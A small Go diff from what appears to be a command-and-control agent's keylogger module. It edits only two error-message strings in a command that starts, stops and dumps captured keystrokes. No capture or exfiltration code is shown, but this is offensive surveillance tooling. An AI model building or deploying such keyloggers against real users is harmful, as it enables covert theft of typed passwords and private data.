@@ -85,7 +85,7 @@ type keylogArgs struct {
 
 func (c *KeylogCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: action required. Use: start, stop, dump, status, clear")
+		return errorResult("action required. Use: start, stop, dump, status, clear")
 	}
 
 	args, parseErr := unmarshalParams[keylogArgs](task)
@@ -131,7 +131,7 @@ func keylogStart() structs.CommandResult {
 		kl.mu.Lock()
 		kl.running = false
 		kl.mu.Unlock()
-		return errorf("Error starting keylogger: %v", err)
+		return errorf("starting keylogger: %v", err)
 	}
 
 	return successResult("Keylogger started. Use 'keylog -action dump' to view captured keystrokes, 'keylog -action stop' to stop.")
